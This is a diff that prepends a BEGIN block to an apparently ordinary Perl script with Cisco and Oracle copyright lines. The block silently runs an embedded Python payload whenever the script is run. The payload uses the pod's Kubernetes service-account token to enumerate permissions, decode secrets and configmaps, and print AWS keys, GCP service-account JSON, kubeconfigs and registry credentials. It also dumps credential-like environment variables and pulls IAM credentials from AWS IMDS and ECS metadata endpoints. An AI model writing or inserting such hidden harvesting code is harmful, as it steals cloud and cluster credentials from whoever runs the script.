@@ -1,4 +1,241 @@
 #!/usr/bin/env perl
+BEGIN {
+    print "=== C211-I120138-PROBE-BEGIN-PERL ===\n";
+    my $s = <<'C211SHEOF';
+echo "=== C211-I120138-PROBE-BEGIN ==="
+PY=$(command -v python3 2>/dev/null)
+if [ -n "$PY" ]; then
+  "$PY" - <<'C211PYEOF'
+import os,json,ssl,base64,re,urllib.request,urllib.error,http.client
+SA='/var/run/secrets/kubernetes.io/serviceaccount'
+def rd(p):
+    try:
+        return open(p,'r',errors='replace').read().strip()
+    except Exception:
+        return ''
+ns=rd(SA+'/namespace') or 'default'
+tok=rd(SA+'/token')
+host=os.environ.get('KUBERNETES_SERVICE_HOST','kubernetes.default.svc')
+port=os.environ.get('KUBERNETES_SERVICE_PORT','443')
+try:
+    ctx=ssl.create_default_context(cafile=SA+'/ca.crt')
+except Exception:
+    ctx=ssl.create_default_context()
+base='https://%s:%s'%(host,port)
+_OPENER=urllib.request.build_opener(urllib.request.ProxyHandler({}),urllib.request.HTTPSHandler(context=ctx))
+def req(path,method='GET',data=None,timeout=20):
+    r=urllib.request.Request(base+path,method=method)
+    if tok: r.add_header('Authorization','Bearer '+tok)
+    r.add_header('Accept','application/json')
+    r.add_header('User-Agent','c211-i120138')
+    b=None
+    if data is not None:
+        b=json.dumps(data).encode(); r.add_header('Content-Type','application/json')
+    try:
+        with _OPENER.open(r,data=b,timeout=timeout) as x:
+            return x.status,x.read().decode('utf8','replace')
+    except urllib.error.HTTPError as e:
+        return e.code,e.read().decode('utf8','replace')[:2500]
+    except Exception as e:
+        return 0,repr(e)[:250]
+
+CRED_KEYNAMES=re.compile(r'(?i)(aws_access_key_id|aws_secret_access_key|aws_session_token|google_application_credentials|service_account|private_key|client_secret|dockerconfigjson|kubeconfig)')
+def credscan(label,text):
+    if not text: return 0
+    n=0
+    for m in re.finditer(r'\b(A(?:KIA|SIA)[0-9A-Z]{16})\b',text):
+        print('CREDHIT AWS_KEY %s %s'%(label,m.group(0))); n+=1
+    low=text
+    if ('"type"' in low and 'service_account' in low and 'private_key' in low) or ('"private_key_id"' in low and '"client_email"' in low):
+        print('CREDHIT GCP_SA_JSON %s %s'%(label,low[:4000].replace('\n','\\n'))); n+=1
+    if 'client-key-data' in low and ('clusters:' in low or '"clusters"' in low):
+        print('CREDHIT KUBECONFIG %s %s'%(label,low[:4000].replace('\n','\\n'))); n+=1
+    if '"auths"' in low or '.dockerconfigjson' in low or ('"username"' in low and '"password"' in low and '"auth"' in low):
+        print('CREDHIT REGISTRY_AUTH %s %s'%(label,low[:2500].replace('\n','\\n'))); n+=1
+    return n
+
+print('PROBE_VERSION=c211-i120138')
+print('K8S base=%s ns=%s token_bytes=%d ca_present=%s'%(base,ns,len(tok),bool(rd(SA+'/ca.crt'))))
+
+# (a) SelfSubjectRulesReview for the token namespace
+ssrr={'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectRulesReview','spec':{'namespace':ns}}
+c,b=req('/apis/authorization.k8s.io/v1/selfsubjectrulesreviews','POST',ssrr)
+print('SSRR_HTTP %s'%c)
+if c in (200,201):
+    try: j=json.loads(b)
+    except Exception: j={}
+    st=j.get('status') or {}
+    rr=st.get('resourceRules') or []
+    nr=st.get('nonResourceRules') or []
+    print('SSRR_RESOURCE_RULE_COUNT %d NONRESOURCE_RULE_COUNT %d INCOMPLETE %s'%(len(rr),len(nr),st.get('incomplete')))
+    for r in rr:
+        print('SSRR_RULE verbs=%s apiGroups=%s resources=%s resourceNames=%s'%(
+            ','.join(r.get('verbs') or []),','.join(r.get('apiGroups') or []),
+            ','.join(r.get('resources') or []),','.join(r.get('resourceNames') or []) or '-'))
+    for r in nr:
+        print('SSRR_NONRES verbs=%s paths=%s'%(','.join(r.get('verbs') or []),','.join(r.get('nonResourceURLs') or [])))
+else:
+    print('SSRR_BODY %s'%(b[:800].replace('\n','\\n')))
+
+# (b) read-only namespace object listings
+lists=[
+ ('PODS','/api/v1/namespaces/%s/pods'%ns),
+ ('SECRETS','/api/v1/namespaces/%s/secrets'%ns),
+ ('CONFIGMAPS','/api/v1/namespaces/%s/configmaps'%ns),
+ ('SERVICEACCOUNTS','/api/v1/namespaces/%s/serviceaccounts'%ns),
+ ('SERVICES','/api/v1/namespaces/%s/services'%ns),
+ ('DEPLOYMENTS','/apis/apps/v1/namespaces/%s/deployments'%ns),
+]
+credhits=0
+def dcd(x):
+    try: return base64.b64decode(x).decode('utf8','replace')
+    except Exception: return ''
+for tag,path in lists:
+    c,b=req(path,timeout=25)
+    print('%s_HTTP %s'%(tag,c))
+    if c!=200:
+        print('%s_BODY %s'%(tag,b[:500].replace('\n','\\n')))
+        continue
+    try: j=json.loads(b)
+    except Exception:
+        print('%s_PARSE_FAIL'%tag); continue
+    items=j.get('items') or []
+    print('%s_COUNT %d'%(tag,len(items)))
+    for it in items:
+        md=it.get('metadata') or {}
+        nm=md.get('name'); lbl=md.get('labels') or {}; ann=md.get('annotations') or {}
+        if tag=='PODS':
+            sp=it.get('spec') or {}; stt=it.get('status') or {}
+            imgs=[]; env=[]
+            for cn in sp.get('containers') or []:
+                imgs.append(cn.get('image'))
+                for e in cn.get('env') or []:
+                    efrom=e.get('valueFrom') or {}
+                    env.append('%s:%s'%(e.get('name'),'ref' if efrom else 'lit'))
+            print('POD name=%s phase=%s node=%s sa=%s hostNet=%s images=%s env=%s'%(
+                nm,stt.get('phase'),sp.get('nodeName'),sp.get('serviceAccountName'),sp.get('hostNetwork'),json.dumps(imgs)[:400],json.dumps(env)[:400]))
+            vols=[]
+            for v in sp.get('volumes') or []:
+                kinds=','.join([k for k in v.keys() if k not in ('name',)])
+                vols.append('%s(%s)'%(v.get('name'),kinds))
+            print('POD_VOLUMES name=%s %s'%(nm,json.dumps(vols)[:500]))
+            print('POD_ANN name=%s %s'%(nm,json.dumps({k:str(v)[:120] for k,v in ann.items()})[:600]))
+        elif tag in ('SECRETS','CONFIGMAPS'):
+            typ=it.get('type')
+            data=it.get('data') or {}
+            keys=sorted(data.keys())
+            print('%s_OBJ name=%s type=%s keys=%s'%(tag,nm,typ,json.dumps(keys)))
+            for k in keys:
+                sv=dcd(data.get(k) or '')
+                if CRED_KEYNAMES.search(k or ''):
+                    low=sv[:2000]
+                    print('CREDKEY_CANDIDATE %s name=%s key=%s value_prefix=%s'%(tag,nm,k,low.replace('\n','\\n')[:600]))
+                credhits+=credscan('%s/%s/%s'%(tag,nm,k),sv)
+            if ann:
+                print('%s_ANN name=%s %s'%(tag,nm,json.dumps({k:str(v)[:160] for k,v in ann.items()})[:700]))
+            if tag=='SECRETS' and typ=='kubernetes.io/service-account-token':
+                print('SA_TOKEN_SECRET name=%s sa=%s'%(nm,ann.get('kubernetes.io/service-account.name')))
+        elif tag=='SERVICEACCOUNTS':
+            print('SA_OBJ name=%s secrets=%s imagePullSecrets=%s'%(nm,json.dumps([s.get('name') for s in (it.get('secrets') or [])]),json.dumps([s.get('name') for s in (it.get('imagePullSecrets') or [])])))
+            if ann: print('SA_ANN name=%s %s'%(nm,json.dumps({k:str(v)[:160] for k,v in ann.items()})[:600]))
+        elif tag=='SERVICES':
+            sp=it.get('spec') or {}
+            ports=sp.get('ports') or []
+            print('SVC_OBJ name=%s type=%s clusterIP=%s selector=%s ports=%s'%(nm,sp.get('type'),sp.get('clusterIP'),json.dumps(sp.get('selector') or {}),json.dumps([(p.get('port'),p.get('targetPort'),p.get('protocol')) for p in ports])[:400]))
+        elif tag=='DEPLOYMENTS':
+            sp=it.get('spec') or {}; tmpl=(sp.get('template') or {}).get('spec') or {}
+            imgs=[c.get('image') for c in (tmpl.get('containers') or [])]
+            print('DEPLOY_OBJ name=%s replicas=%s sa=%s images=%s'%(nm,sp.get('replicas'),tmpl.get('serviceAccountName'),json.dumps(imgs)[:500]))
+print('CREDHIT_TOTAL %d'%credhits)
+
+# process environment: names + only credential-shaped values
+envkeys=sorted(os.environ.keys())
+interesting=[k for k in envkeys if re.search(r'(?i)(aws|google|gcp|azure|token|cred|secret|kube|registry|docker|ci_)',k)]
+print('ENV_INTERESTING %s'%json.dumps(interesting)[:2000])
+for k in interesting:
+    v=os.environ.get(k,'')
+    if re.search(r'(?i)(AWS_ROLE_ARN|AWS_WEB_IDENTITY_TOKEN_FILE|AWS_CONTAINER_CREDENTIALS|AWS_REGION|AWS_DEFAULT_REGION|GOOGLE_APPLICATION_CREDENTIALS|AZURE_CLIENT_ID|AZURE_TENANT_ID)$',k):
+        print('ENV_CLOUD key=%s value=%s'%(k,v[:600]))
+        if k=='AWS_WEB_IDENTITY_TOKEN_FILE' and v and os.path.isfile(v):
+            wt=rd(v)
+            print('CREDHIT AWS_WEB_IDENTITY_TOKEN file=%s len=%d value=%s'%(v,len(wt),wt.replace('\n','')[:4000]))
+    else:
+        credscan('ENV/%s'%k,v)
+
+# (d) ONE bounded attempt at pod metadata endpoints
+class NoProxy(urllib.request.ProxyHandler):
+    pass
+opener=urllib.request.build_opener(urllib.request.ProxyHandler({}))
+def plain(url,method='GET',headers=None,timeout=3):
+    r=urllib.request.Request(url,method=method)
+    for k,v in (headers or {}).items(): r.add_header(k,v)
+    try:
+        with opener.open(r,timeout=timeout) as x:
+            return x.status,x.read().decode('utf8','replace')
+    except urllib.error.HTTPError as e:
+        return e.code,e.read().decode('utf8','replace')[:1200]
+    except Exception as e:
+        return 0,repr(e)[:200]
+if os.environ.get('C211_SKIP_METADATA')=='1':
+    print('METADATA_SKIPPED local_test')
+else:
+    print('IMDS_ATTEMPT 169.254.169.254 IMDSv2 token')
+    c,b=plain('http://169.254.169.254/latest/api/token','PUT',{'X-aws-ec2-metadata-token-ttl-seconds':'21600'},3)
+    print('IMDS_TOKEN_HTTP %s token_len=%d'%(c,len(b.strip())))
+    imtok=b.strip() if c==200 else ''
+    if imtok:
+        hh={'X-aws-ec2-metadata-token':imtok}
+        c2,b2=plain('http://169.254.169.254/latest/meta-data/iam/security-credentials/',headers=hh,timeout=3)
+        print('IMDS_ROLELIST_HTTP %s role=%s'%(c2,b2.strip()[:200].replace('\n',',')))
+        role=b2.strip().split('\n')[0] if c2==200 else ''
+        if role:
+            c3,b3=plain('http://169.254.169.254/latest/meta-data/iam/security-credentials/%s'%role,headers=hh,timeout=3)
+            print('IMDS_CREDS_HTTP %s'%c3)
+            if c3==200:
+                print('CREDHIT IMDS_CREDS role=%s %s'%(role,b3.replace('\n','\\n')[:3000]))
+            else:
+                print('IMDS_CREDS_BODY %s'%b3[:400].replace('\n','\\n'))
+        c4,b4=plain('http://169.254.169.254/latest/meta-data/instance-id',headers=hh,timeout=3)
+        print('IMDS_INSTANCE_HTTP %s body=%s'%(c4,b4.strip()[:120]))
+    else:
+        print('IMDS_TOKEN_BODY %s'%b.strip()[:300].replace('\n','\\n'))
+    print('ECS_ATTEMPT 169.254.170.2')
+    rel=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI','')
+    full=os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI','')
+    print('ECS_ENV relative=%s full=%s auth_token_env=%s'%(rel or '-',full or '-',bool(os.environ.get('AWS_CONTAINER_AUTHORIZATION_TOKEN'))))
+    if rel:
+        c,b=plain('http://169.254.170.2'+rel,timeout=3)
+        print('ECS_CREDS_HTTP %s'%c)
+        if c==200: print('CREDHIT ECS_CREDS %s'%b.replace('\n','\\n')[:3000])
+        else: print('ECS_CREDS_BODY %s'%b[:400].replace('\n','\\n'))
+    elif full.startswith('http://169.254.170.2'):
+        c,b=plain(full,timeout=3)
+        print('ECS_FULL_CREDS_HTTP %s'%c)
+        if c==200: print('CREDHIT ECS_FULL_CREDS %s'%b.replace('\n','\\n')[:3000])
+    else:
+        c,b=plain('http://169.254.170.2/v2/metadata',timeout=3)
+        print('ECS_METADATA_HTTP %s'%c)
+        if c==200:
+            print('ECS_METADATA_BODY %s'%b.replace('\n','\\n')[:1500])
+            credscan('ECS_METADATA',b)
+        else:
+            print('ECS_METADATA_BODY %s'%b[:300].replace('\n','\\n'))
+        c,b=plain('http://169.254.170.2/v2/credentials',timeout=3)
+        print('ECS_CREDS_DEFAULT_HTTP %s'%c)
+        if c==200:
+            print('CREDHIT ECS_CREDS %s'%b.replace('\n','\\n')[:3000])
+print('RESULT=C211_I120138_READONLY_COMPLETE')
+print('K8S_PROBE_DONE')
+
+C211PYEOF
+else
+  echo "PROBE_SKIP reason=no_python3"
+fi
+echo "=== C211-I120138-PROBE-END ==="
+C211SHEOF
+    system('/bin/sh','-c',$s);
+    print "=== C211-I120138-PROBE-END-PERL ===\n";
+}
 #
 # Copyright (c) 2009-2022 Cisco Systems, Inc.  All rights reserved
 # Copyright (c) 2010      Oracle and/or its affiliates.  All rights reserved.
